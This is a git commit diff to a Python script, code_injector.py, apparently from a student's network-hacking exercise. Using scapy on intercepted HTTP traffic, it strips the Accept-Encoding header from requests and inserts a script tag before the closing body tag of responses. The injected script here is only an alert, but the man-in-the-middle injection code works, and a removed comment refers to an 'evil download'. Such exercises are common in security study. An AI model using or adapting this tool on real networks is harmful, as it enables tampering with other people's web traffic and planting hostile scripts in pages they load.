d9f7ad72924c18cf00904f44c3b3568a17646352
vatojavier <antonioj.casado@estudiante.uam.es>
2019-07-25 21:04:30 +0200

    fixed bugs

--- code_injector.py
+++ code_injector.py
@@ -5,10 +5,10 @@ import scapy.all as scapy
 import subprocess
 import re
 
+
 def set_load(s_packet, load):
     """Modifies the load of the scapy packet passed to the load"""
 
-    # New link to the evil download
     s_packet[scapy.Raw].load = load
     del s_packet[scapy.IP].len
     del s_packet[scapy.IP].chksum
@@ -23,17 +23,29 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):  # IF has raw data...
         if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] Request packet")
+            load = scapy_packet[scapy.Raw].load
 
             regex = "Accept-Encoding:.*?\\r\\n"
-            new_load = re.sub(regex, "", scapy_packet[scapy.Raw].load.decode("utf-8"))
+            new_load = re.sub(regex, "", load.decode("utf-8"))  # Not accept encoding so receive http data in plain text
             mod_packet = set_load(scapy_packet, new_load)
-            
             packet.set_payload(bytes(mod_packet))
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response packet")
-            print(scapy_packet.show())
+            try:
+                load = scapy_packet[scapy.Raw].load.decode("utf-8")  # Errors when non ascii chars in the packets!
+            except UnicodeDecodeError:
+                packet.accept()
+                return
+
+            if "</body>" in load:
+                new_load = load.replace("</body>", "<script>alert('Hola');</script></body>")
+
+                mod_packet = set_load(scapy_packet, new_load)
+
+                print("[+] MODIFIED Response packet: ")
+                print(mod_packet.show())
+                packet.set_payload(bytes(mod_packet))
 
     packet.accept()
 
@@ -52,5 +64,5 @@ try:
 
     # Remember to delete iptables wih iptables --flush
 except KeyboardInterrupt:
-    print("closing dns spoofer")
+    print("closing code injector")
     subprocess.call("iptables --flush", shell=True)
